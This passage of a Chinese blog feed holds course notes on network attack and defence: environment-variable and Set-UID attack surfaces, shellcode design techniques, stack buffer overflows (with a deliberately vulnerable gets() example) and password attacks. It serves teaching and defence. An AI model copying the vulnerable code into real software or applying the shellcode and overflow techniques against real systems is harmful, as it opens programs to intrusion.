针对会话保持攻击</h3><p>主要的防范措施就是不能让会话ID号长期有效，如采用强制销毁措施或用户登录后更改会话ID号等</p><h3 id="4-3-5-针对CSRF攻击">4.3.5 针对CSRF攻击</h3><p>（1）使用POST替代GET（2）检验HTTP referer（3）验证码（4）使用Token</p>]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>环境变量</title>
    <link href="/2024/02/20/6_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"/>
    <url>/2024/02/20/6_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h1>1 概述</h1><p><strong>环境变量概念</strong></p><ul><li><p>一组动态的定义值</p></li><li><p>操作系统运行环境的一部分</p></li><li><p>影响正在运行进程的行为方式（加载哪些外部DLL）</p></li><li><p>在Unix中提出，也被微软操作系统采用</p></li><li><p>示例：PATH变量</p><p>当执行一个程序时，如果没有提供完整的路径，shell进程将使用环境变量来找到程序的位置</p></li></ul><h1>2 如何访问环境变量</h1><h2 id="2-1-从主函数中访问">2.1 从主函数中访问</h2><img src="/2024/02/20/6_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/6.1.png" class=""><h2 id="2-2-更可靠的方法：使用全局变量">2.2 更可靠的方法：使用全局变量</h2><img src="/2024/02/20/6_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/6.2.png" class=""><h1>3 进程如何获取环境变量</h1><p>进程可以通过以下两种方式来获取环境变量：</p><ul><li><p>如果使用fork()创建了一个新进程，则子进程将继承其父进程的环境变量。</p></li><li><p>如果进程使用execve()启动一个新程序，在此场景中内存空间被覆盖，所有旧环境变量将丢失。可以以一种特殊的方式调用执行 lost.Execve()，以将环境变量从一个进程传递给另一个进程。</p></li></ul><h1>4 环境变量的内存位置</h1><ul><li>envp和environ最初指向同一个地方</li><li>envp只能在主函数中可访问，而 environ 是一个全局变量</li><li>当对环境变量进行更改时（例如添加新变量），存储环境变量的位置可能会移动到堆中，因此environ将发生更改（envp不会更改）</li></ul><img src="/2024/02/20/6_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/6.3.png" class=""><h1>5 shell命令变量和环境变量</h1><ul><li><p>人们经常认为shell命令变量和环境变量是相同的。</p></li><li><p>shell命名变量：</p><ul><li><p>shell使用的内部变量。</p></li><li><p>shell提供了内置命令，允许用户创建、分配和删除Shell变量。</p></li><li><p>在这个示例中，我们创建了一个名为FOO的shell变量。</p><img src="/2024/02/20/6_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/6.4.png" class=""></li></ul></li></ul><h1>6 /proc 文件系统的知识</h1><ul><li>/proc是linux中的一个虚拟文件系统。它包含每个进程的一个目录，使用进程ID作为目录的名称</li><li>每个进程目录都有一个名为environ的虚拟文件，其中包含进程的环境<ul><li>虚拟文件/proc/932/environ 包含进程932的环境变量</li><li>命令“<code>strings /proc/$$/environ</code>”将打印出当前进程的环境变量(shell将把$$替换为它自己的进程ID)</li></ul></li><li>当在bash shell中调用env程序时，它将在子进程中运行。因此，它打印出shell子进程的环境变量，而不是它自己的环境变量。</li></ul><h1>7 set-UID概念</h1><ul><li>每个进程都有两个用户ID。<ul><li>Real UID (RUID):确定进程的真正所有者</li><li>Effective UID (EUID): 标识进程的权限<ul><li>访问控制基于EUID</li></ul></li></ul></li><li>当执行正常程序时 , RUID = EUID, 它们都等于运行程序的用户的ID</li><li>当执行Set-UID时, RUID ≠ EUID. RUID还是用户 ID, 但是 EUID 是程序 owner的 ID.<ul><li>如果程序归root所有，则程序以root权限运行。</li></ul></li><li>允许用户以程序所有者的权限运行程序。</li><li>允许用户以临时提升的权限运行程序</li></ul><h1>8 环境变量的攻击面</h1><p>环境变量隐藏使用是危险的。由于用户可以设置环境变量，因此它们将成为Set-UID程序的攻击面的一部分。</p><img src="/2024/02/20/6_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/6.5.png" class=""><h2 id="8-1-通过动态链接器攻击">8.1 通过动态链接器攻击</h2><ul><li><p>链接可以找到在程序中引用的外部库代码;</p></li><li><p>链接可以在运行时或编译时完成：</p><ul><li>动态链接-使用环境变量，它将成为攻击面的一部分</li><li>静态链接</li></ul></li></ul><h3 id="8-1-1-示例">8.1.1 示例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*hello.c*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>静态链接</strong></p><ul><li><p>该链接器结合了程序的代码和包含 printf()函数的库代码;</p></li><li><p>静态编译程序的大小是动态程序的100倍.</p><img src="/2024/02/20/6_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/6.6.png" class=""></li></ul><p><strong>动态链接</strong></p><ul><li>该链接将在运行时完成<ul><li>共享库（Windows中的DLL文件）</li></ul></li><li>在运行使用动态链接编译的程序之前，首先将其可执行文件加载到内存</li></ul><img src="/2024/02/20/6_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/6.7.png" class=""><ul><li><p>可以使用“ldd”命令来查看程序依赖于什么共享库</p><img src="/2024/02/20/6_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/6.8.jpg" class=""></li></ul><h3 id="8-1-2-通过动态链接器进行攻击：风险">8.1.2 通过动态链接器进行攻击：风险</h3><ul><li>动态链接节省内存</li><li>这意味着程序在编译期间未决定部分代码</li><li>如果用户可以影响丢失的代码，它们可能会损害程序的完整性</li></ul><p><strong>案例</strong></p><ul><li>LD_PRELOAD 包含一个共享库的列表，链接器将首先搜索它；</li><li>如果没有找到所有函数，链接器将在几个文件夹列表中搜索，包括LD_LIBRARY_PATH指定的文件夹；</li><li>这两个变量都可以由用户设置，因此使他们有机会控制链接过程结果；</li><li>如果该程序是一个Set-UID程序，它可能会导致安全漏洞。</li></ul><p><strong>对策</strong></p><p>动态连接器实现了一个对策。当EUID和RUID不同时，它会忽略LD_PRELOAD和LD_LIBRARY_PATH环境变量。</p><h2 id="8-2-通过外部程序攻击">8.2 通过外部程序攻击</h2><ul><li>应用程序可以调用外部程序。</li><li>应用程序本身可能不使用环境变量，但被调用的外部程序可能会使用。</li><li>调用外部程序的典型方法：<ul><li>执行exec()函数家族，它们调用执行execve()：直接运行程序</li><li>system()<ul><li>system()函数调用execl()</li><li>execl()最终调用execve()运行/bin/sh</li><li>然后，shell程序运行该程序</li></ul></li></ul></li><li>system()和execve()的对比<ul><li>与system()相比，execve()的攻击面更小</li><li>execve()不调用shell，因此不受环境变量的影响</li><li>当在特权程序中调用外部程序时，我们应该使用 execve()</li></ul></li></ul><h2 id="8-3-通过外部库的攻击">8.3 通过外部库的攻击</h2><p>程序通常使用来自外部库的函数。如果这些函数使用环境变量，则它们会添加到攻击表面。</p><h2 id="8-4-通过应用程序代码攻击">8.4 通过应用程序代码攻击</h2><p>程序可以直接使用环境变量。如果这些是特权程序，它可能会导致不可信任的输入。</p><img src="/2024/02/20/6_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/6.9.png" class=""><ul><li>该程序使用getenv()从PWD环境变量中了解其当前目录</li><li>然后，程序将其复制到一个数组“arr”中，但忘记检查输入的长度。这将导致潜在的缓冲区溢出。</li><li>PWD的值来自于shell程序，所以每次我们更改文件夹时，shell程序都会更新其shell变量。</li><li>我们可以自己改变外壳变量。</li></ul><img src="/2024/02/20/6_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/6.10.jpg" class=""><p><strong>通过应用程序代码进行攻击的对策</strong></p><ul><li>当具有特权的Set-UID程序使用环境变量时，必须对它们进行正确的清理。</li><li>开发人员可以选择使用一个安全版本的getenv()，比如secure_getenv()。<ul><li>Getenv()的工作原理是通过搜索环境变量列表并返回指向找到的字符串的指针。</li><li>secure_getenv()的工作方式完全相同，除了当需要“安全执行”时，它返回NULL。</li><li>安全执行由流程的用户/组的EUID和RUID不匹配等条件定义</li></ul></li></ul><h1>9 Set-UID方法VS服务方法</h1><img src="/2024/02/20/6_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/6.11.jpg" class=""><ul><li><p>大多数操作系统遵循两种方法，允许正常用户执行特权操作</p><ul><li>Set-UID方法：普通用户必须运行一个特殊的程序才能临时获得root权限</li><li>服务方法：普通用户必须请求特权服务才能为他们执行操作。</li></ul></li><li><p>Set-UID具有更广泛的攻击面，这是由环境变量引起的</p><ul><li>在Set-UID方法中不能信任环境变量</li><li>环境变量在服务方法中可以被信任</li></ul></li><li><p>尽管其他攻击面仍然适用于服务方法（在第1章中讨论），但它被认为比Set-UID方法更安全</p></li><li><p>因此，安卓操作系统完全删除了Set-UID和Set-GID机制</p></li></ul><blockquote><p>Set-UID不要求一直运行一个后台进程，性能会更好，但是在Set-UID机制中，环境变量是从普通用户那里获得的，基于服务的机制中，服务是由特权父进程或操作系统启动，环境变量来自可信实体。故 Set-UID有更大的攻击面。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>shellcode</title>
    <link href="/2024/02/20/5_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_shellcode%E7%BC%96%E5%86%99/"/>
    <url>/2024/02/20/5_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_shellcode%E7%BC%96%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h1>1 概述</h1><p><strong>概念</strong></p><p>ShellCode就是一段能够完成一定功能(比如打开一个命令窗口)、可直接由计算机执行的机器代码，通常以十六进制的形式存在。</p><p><strong>shellcode的功能</strong></p><p>可以是处于恶作剧弹出对话框、打开dos窗口（执行任意程序）、添加系统管理用户、打开可以远程连接的端口、发起反向连接、上传（下载）木马病毒并运行可能是攻击性的，删除重要文件、窃取数据破坏，格式化磁盘…</p><h1>2 通用shellcode的编写</h1><h2 id="2-1-正常退出">2.1 正常退出</h2><ul><li><p>process：用 ExitProcess()</p></li><li><p>SEH：强制产生一个异常调用。记住这种方法可能会使 exploit 代码不停的运行。</p></li><li><p>thread：用 ExitThread()</p></li></ul><h2 id="2-2-处理null字节">2.2 处理null字节</h2><ul><li>可替代指令&amp;指令编码<ul><li>用 add&amp;sub 来重新产生原来的值</li><li>sniper:precision-null-byte-boming</li><li>将原始值一字节一字节写入</li><li>xor</li><li>寄存器：32 位-&gt;16 位-&gt;8 位</li><li>用可替代指令</li><li>从 null 字节到空格&amp;null 字节</li></ul></li><li>编码器：payload 编码</li></ul><h2 id="2-3-加载dll">2.3 加载dll</h2><h1>3 通用ShellCode的编写</h1><h2 id="3-1-通用ShellCode的编写方法">3.1 通用ShellCode的编写方法</h2><ul><li><p>将每个版本的Windows操作系统所地应的函数的地址列出来，然后针对不同版本的操作系统使用不用的地址</p></li><li><p>动态定位函数地址</p><p>即：使用GetProcAddress和LoadLibrary函数动态获取其它函数的地址</p></li></ul><h2 id="3-2-动态定位函数地址">3.2 动态定位函数地址</h2><img src="/2024/02/20/5_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_shellcode%E7%BC%96%E5%86%99/5.1.png" class=""><h3 id="获取GetProcess和LoadLibrary地址">获取GetProcess和LoadLibrary地址</h3><h4 id="1、暴力搜索">1、暴力搜索</h4><p>LoadLibraryA/W是在系统库kernel32.dll中，其地址也可以使用GetProcAddress得到，而Kernel32.dll一般都会加载，所以只要在内存中查找Kernel32.dll库和GetProcAddress函数的地址就可以。</p><h4 id="2、使用PEB获取GetProcAddress地址">2、使用PEB获取GetProcAddress地址</h4><p><strong>TEB</strong>: Thread Environment Block,线程环境块</p><p>系统在此TEB中保存频繁使用的线程相关的数据。位于用户地址空间，在比 PEB 所在地址低的地方。进程中的每个线程都有自己的一个TEB。一个进程的所有TEB都以堆栈的方式，存放在从0x7FFDE000开始的线性内存中，每 4KB为一个完整的TEB，不过该内存区域是向下扩展的。在用户模式下，当前线程的TEB位于独立的4KB段，可通过CPU的FS寄存器来访问该段，一般存储在[FS:0]</p><p><strong>PEB</strong>: Process Environment Block，进程环境块</p><img src="/2024/02/20/5_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_shellcode%E7%BC%96%E5%86%99/5.2.png" class=""><p><strong>引出表</strong></p><img src="/2024/02/20/5_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_shellcode%E7%BC%96%E5%86%99/5.3.png" class=""><ul><li>在<strong>函数名称数组</strong>中查找需要的<strong>函数名</strong></li><li>在<strong>函数序号数组</strong>中查找对应的<strong>函数序号</strong></li><li>根据<strong>函数序号</strong>在地址数组中得到对应的<strong>地址值</strong></li></ul><h4 id="3、SHE获得kernel基址">3、SHE获得kernel基址</h4><img src="/2024/02/20/5_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_shellcode%E7%BC%96%E5%86%99/5.3.jpg" class=""><h4 id="4、HASH法查找所有函数地址">4、HASH法查找所有函数地址</h4><ul><li>使用类似查找GetProcAddress函数地址的方法查找其它函数</li><li>引入HASH的思想，缩短查到的代码</li><li>将各个函数的函数名通过一个简单但较好的HASH算法产生一个定长的hash值，然后进行比较</li><li>算法：字符[0]右移13位+字符[1]右移13位+……+最后一个字符</li></ul>]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>缓冲区溢出</title>
    <link href="/2024/02/20/4_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    <url>/2024/02/20/4_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h1>1 概述</h1><p><strong>漏洞的定义</strong></p><p>指信息系统硬件、软件、操作系统、网络协议、数据库等在设计上、实现上出现的可以被攻击者利用的<strong>错误、缺陷和疏漏</strong>。通俗一点说，漏洞就是可以被攻击利用的系统弱点。</p><p>从导致的后果来看，漏洞可能会造成：以匿名身份直接获取系统最高权限；从普通用户提升为管理员用户；实施远程拒绝服务攻击等。</p><p><strong>漏洞攻击步骤</strong></p><p>漏洞发现（Vulnerability Discovery）→漏洞分析（Vulnerability Analysis）→漏洞利用（Vulnerability Exploit）</p><p><strong>漏洞的标准化研究</strong></p><ul><li>公共漏洞和暴露（Common Vulnerabilities &amp; Exposures，CVE）</li><li>通用缺陷枚举（Common Weakness Enumeration, CWE）</li></ul><h1>2 典型漏洞类型</h1><h2 id="2-1-栈溢出（Stack-Overflow，CWE-121）">2.1 栈溢出（Stack Overflow，CWE-121）</h2><blockquote><p>背景</p><p>栈溢出攻击的相关概念最早要追述到1972年美国空军发表的一份研究报告《Computer Security Technology Planning Study》。在这份报告中，通过溢出缓冲区来注入代码这一想法首次被提了出来。</p><p>直到1986年才出现了首次真实的攻击，Morris蠕虫病毒利用了Unix操作系统中fingerd程序的gets()函数导致的栈溢出来实现远程代码执行。</p><p>1996年，Elias Levy (a.k.a Aleph One)在大名鼎鼎的Phrack杂志上发表了文章《Smashing the Stack for Fun and Profit》，从此栈溢出漏洞的利用技术被广泛知晓。</p></blockquote><h3 id="2-1-1-栈基础">2.1.1 栈基础</h3><ul><li><p>当程序运行时，计算机会在内存区域中开辟一段连续的内存块，包括代码段、数据段和堆栈段三部分。</p><img src="/2024/02/20/4_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.1.jpg" class=""></li><li><p>程序在内存中的存放形式</p><img src="/2024/02/20/4_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.2.png" class=""><ul><li><p><strong>代码段</strong>(.text)，也称文本段(Text Segment)，存放着程序的机器码和只读数据，可执行指令就是从这里取得的。如果可能，系统会安排好相同程序的多个运行实体共享这些实例代码。这个段在内存中一般被标记为只读，任何对该区的写操作都会导致段错误(Segmentation Fault)。</p></li><li><p><strong>数据段</strong>，包括已初始化的数据段(.data)和未初始化的数据段(.bss)，前者用来存放保存全局的和静态的已初始化变量，后者用来保存全局的和静态的未初始化变量。数据段在编译时分配。</p></li><li><p><strong>堆栈段</strong>分为堆和栈</p><ul><li><p>堆（Heap）</p><ul><li>位于BSS内存段的上边，用来存储程序运行时分配的变量。</li><li>堆的大小并不固定，可动态扩张或缩减。其分配由malloc()、new()等这类实时内存分配函数来实现。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</li><li>堆的内存释放由应用程序去控制，通常一个new()就要对应一个delete()，如果程序员没有释放掉，那么在程序结束后操作系统会自动回收。</li></ul></li><li><p>栈（Stack）</p><ul><li><p>一种用来存储函数调用时的临时信息的结构，如函数调用所传递的参数、函数的返回地址、函数的局部变量等。</p></li><li><p>在程序运行时由编译器在需要的时候分配，在不需要的时候自动清除。</p></li><li><p>栈的特性: 最后一个放入栈中的物体总是被最先拿出来，这个特性通常称为先进后出(FILO)队列。</p></li><li><p>栈的基本操作</p><ul><li>PUSH操作：向栈中添加数据，称为压栈，数据将放置在栈顶；</li><li>POP操作：POP操作相反，在栈顶部移去一个元素，并将栈的大小减一，称为弹栈。</li></ul><img src="/2024/02/20/4_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.3.png" class=""></li></ul></li></ul></li></ul></li></ul><p><strong>程序在内存中的影像</strong></p><ul><li>随着函数调用层数的增加，函数栈帧是一块块地向内存<strong>低地址</strong>方向延伸的。</li><li>随着进程中函数调用层数的减少，即各函数调用的返回，栈帧会一块块地被遗弃而向内存的高址方向回缩。</li><li>各函数的栈帧大小随着函数的性质的不同而不等，由函数的局部变量的数目决定。</li><li>在溢出中，我们主要关注数据区和堆栈区。</li></ul><p><strong>程序所使用的栈</strong></p><ul><li><p>在使用栈时，引用栈帧需要借助两个寄存器。</p><ul><li>一个是SP(ESP)，即栈顶指针，它随着数据入栈出栈而发生变化。</li><li>另一个是BP(EBP)，即基地址指针，它用于标识栈中一个相对稳定的位置，通过BP，再加上偏移地址，可以方便地引用函数参数以及局部变量。</li></ul></li><li><p>函数被调用的时候，栈中的压入情况</p><img src="/2024/02/20/4_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.4.png" class=""><ul><li>如果局部变量发生溢出，很有可能会覆盖掉EBP甚至RET(返回地址)，这就是缓冲区溢出攻击的“奥秘”所在。</li></ul></li></ul><h3 id="2-1-2-栈溢出原理">2.1.2 栈溢出原理</h3><ul><li>如果在堆栈中压入的数据超过预先给堆栈分配的容量时，就会出现堆栈溢出，从而使得程序运行失败；如果发生溢出的是大型程序还有可能会导致系统崩溃。</li><li>程序中发生函数调用时，计算机做如下操作：<ul><li>首先把指令寄存器EIP（它指向当前CPU将要运行的下一条指令的地址）中的内容压入栈，作为程序的返回地址（下文中用RET表示）；</li><li>之后放入栈的是基址寄存器EBP，它指向当前函数栈帧（stack frame）的底部；</li><li>然后把当前的栈指针ESP拷贝到EBP，作为新的基地址，最后为本地变量的动态存储分配留出一定空间，并把ESP减去适当的数值。</li></ul></li></ul><h3 id="2-1-3-栈溢出实例">2.1.3 栈溢出实例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123; <br> <span class="hljs-type">char</span> name[<span class="hljs-number">16</span>]; <br> gets(name); <br> <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">16</span>&amp;&amp;name[i];i++) <br> <span class="hljs-built_in">printf</span>(“%c”,name[i]); <br>&#125;<br></code></pre></td></tr></table></figure><p>编译上述代码，输入hello world！ 结果会输出hello world！</p><ul><li><p>在调用main()函数时，程序对栈的操作：</p><ul><li>先在栈底压入返回地址</li><li>接着将栈指针EBP入栈，并把EBP修改为现在的ESP</li><li>之后ESP减16，即向上增长16个字节，用来存放name[]数组</li></ul></li><li><p>现在栈的布局如图所示</p><img src="/2024/02/20/4_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.5.png" class=""></li><li><p>执行完gets(name)之后，栈中的内容如下图所示</p><img src="/2024/02/20/4_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.6.png" class=""></li><li><p>接着执行for循环，逐个打印name[]数组中的字符，直到碰到0x00字符</p></li><li><p>最后，从main返回，将ESP增加16以回收name[]数组占用的空间，此时ESP指向先前保存的EBP值。程序将这个值弹出并赋给EBP，使EBP重新指向main()函数调用者的栈的底部。然后再弹出现在位于栈顶的返回地址RET，赋给EIP，CPU继续执行EIP所指向的命令。</p><blockquote><p>说明1：EIP寄存器的内容表示将要执行的下一条指令地址。</p><p>说明2：当调用函数时， Call指令会将返回地址(Call指令下一条指令地址)压入栈Ret指令会把压栈的返回地址弹给EIP</p></blockquote></li><li><p>如果输入的字符串长度超过16个字节，例如输入：Hello world!AAAAAAAA……，则当执行完gets(name)之后，栈的情况如图所示。</p><img src="/2024/02/20/4_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.7.png" class=""><ul><li>由于输入的字符串太长，name[]数组容纳不下，只好向栈的底部方向继续写‘A’。这些‘A’覆盖了堆栈的老的元素，从上页图可以看出，EBP，Ret 都已经被‘A’覆盖了。</li><li>从main返回时，就必然会把‘AAAA’的ASCII码——0x41414141视作返回地址，CPU会试图执行0x41414141处的指令，结果出现难以预料的后果，这样就产生了一次堆栈溢出。</li></ul></li></ul><h1>3 溢出漏洞利用原理</h1><h2 id="3-1-溢出攻击的基本流程">3.1 溢出攻击的基本流程</h2><p>注入恶意数据→溢出缓冲区→控制流重定向→执行有效载荷</p><h3 id="3-1-1-溢出点定位">3.1.1 溢出点定位</h3><p><strong>探测法</strong>：构造数据，根据出错的情况来判断、<strong>反汇编分析</strong></p><h3 id="3-1-2-覆盖执行控制地址">3.1.2 覆盖执行控制地址</h3><p>执行控制地址可包括：覆盖返回地址、覆盖函数指针变量、覆盖异常处理结构</p><h3 id="3-1-3-覆盖异常处理结构">3.1.3 覆盖异常处理结构</h3><ul><li>异常处理是一种对程序异常的处理机制，它把错误处理代码与正常情况下所执行的代码分开。</li><li>当程序发生异常时，系统中断当前线程，将控制权交给异常处理程序</li><li>Windows的异常处理机制称为结构化异常处理（Structured Exception Handling ）</li></ul><h3 id="3-1-4-跳转地址的确定">3.1.4 跳转地址的确定</h3><ul><li>跳转指令的选取：<code>jmp esp</code>、<code>call ebx</code>、<code>call ecx</code>等</li><li>跳转指令的搜索范围<ul><li>用户空间的任意地址、系统dll、进程代码段、PEB、TEB</li><li>跳转指令地址的选择规律</li></ul></li></ul><h3 id="3-1-5-Shellcode定位和跳转">3.1.5 Shellcode定位和跳转</h3><p>Shellcode的基本构成</p><img src="/2024/02/20/4_%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.8.png" class=""><ul><li>Nop Sled：类NOP指令填充，可以是NOP，也可以是<code>inc eax</code>等无副作用指令。</li><li>Decoder：解码部分，对Real_Shellcode解码。</li><li>Real_Shellcode：真正有意义的shellcode部分，但是经过了编码处理。</li></ul><h2 id="3-2-溢出利用的关键技术">3.2 溢出利用的关键技术</h2><h1>4 漏洞利用保护机制</h1><h2 id="4-1-更安全的函数">4.1 更安全的函数</h2><p>有些内存复制函数靠数据中的某些特殊字符来判断是否复制完成，这样复制的长度取决于数据，更安全的 是由程序来指定长度</p><table><thead><tr><th>不安全</th><th>安全</th></tr></thead><tbody><tr><td>strcpy</td><td>strncpy</td></tr><tr><td>sprintf</td><td>snprintf</td></tr><tr><td>strcat</td><td>strncat</td></tr><tr><td>gets</td><td>fgets</td></tr></tbody></table><h2 id="4-2-更安全的动态链接库">4.2 更安全的动态链接库</h2><p>开发一个安全的动态链接库替换不安全的库。如libsafe函数库，基于ebp进行边界检测，不允许复制超出帧指针 的边界。libmib函数库，为strcpy等函数提供安全版本。</p><h2 id="4-3-编程语言">4.3 编程语言</h2><p>语言本身可以检测缓冲区溢出。如python和java，提供自动边界检查。</p><h2 id="4-4-地址随机化">4.4 地址随机化</h2><p>ASLR（Address space layout randomization）地址空间配置随机化。为了成功实施缓冲区溢出攻击， 攻击者需要使漏洞程序返回到他们注入的代码，就首先需要猜测注入代码的地址。操作系统以前总是把栈放在固定位置，而ASLR就是为了解决这个问题。静态ASLR是指除了程序映像以外的内存区域都被随机化。</p><h2 id="4-5-StackGuard">4.5 StackGuard</h2><p><strong>防御思路</strong></p><p>基于栈的缓冲区溢出攻击需要修改返回地址，如果能够在函数返回前检测到返回<strong>地址是否被修改</strong>，就能抵御攻击。一种方法是将返回地址备份到其他地方。而StackGuard是在返回地址和缓冲区之间设置一个哨兵，这个哨兵来检测返回地址是否被修改。</p><p><strong>原理</strong></p><p>缓冲区溢出攻击修改返回地址时，所有处于缓冲区和返回地址之间的内存值也会被修改。不想改变某个 特定位置的值，唯一方法是用相同的值覆盖这个位置</p>]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>口令攻击</title>
    <link href="/2024/02/20/3_%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB/"/>
    <url>/2024/02/20/3_%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1>1 概述</h1><h2 id="1-1-身份认证">1.1 身份认证</h2><p>用户向计算机系统以一种安全的方式提交自己的身份证明，然后由系统确认用户的身份是否属实，最终拒绝用户或者赋予用户一定的权限。</p><h2 id="1-2-身份认证的关系">1.2 身份认证的关系</h2><p><strong>常见的身份验证思路</strong></p><p>What you know？ What you have？ Who you are ？  Where you are？</p><p><strong>计算机领域中的身份认证</strong></p><ul><li><p>用户名和密码验证</p></li><li><p>磁卡或者智能卡认证</p></li><li><p>基于人的生理特征认证</p></li><li><p>基于地理位置的认证</p></li><li><p>其它的特殊的认证方式</p></li></ul><p><strong>身份认证的过程</strong></p><img src="/2024/02/20/3_%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB/3.1.png" class=""><h1>2 针对口令强度的攻击</h1><h2 id="2-1-字典攻击">2.1 字典攻击</h2><p>将使用概率较高的口令集中存放在字典文件中，通过不同的变异规则生成猜测字典</p><h2 id="2-2-强力攻击">2.2 强力攻击</h2><p>速度足够快的计算机能尝试字母、数字、特殊字符所有的组合，将最终破解所有的口令</p><h2 id="2-3-组合攻击">2.3 组合攻击</h2><h2 id="2-4-撞库攻击">2.4 撞库攻击</h2><p>攻击者通过收集在网络上已泄露的用户名、口令等信息，之后用这些账号和口令尝试批量登录其他网站，最终得到可以登录这些网站的用户账号和口令</p><h2 id="2-5-彩虹表攻击">2.5 彩虹表攻击</h2><p>彩虹表就是一种破解哈希算法的技术，主要可以破解MD5、HASH等多种密码</p><h1>3 针对口令存储的攻击</h1><h2 id="3-1-Linux口令存储机制">3.1 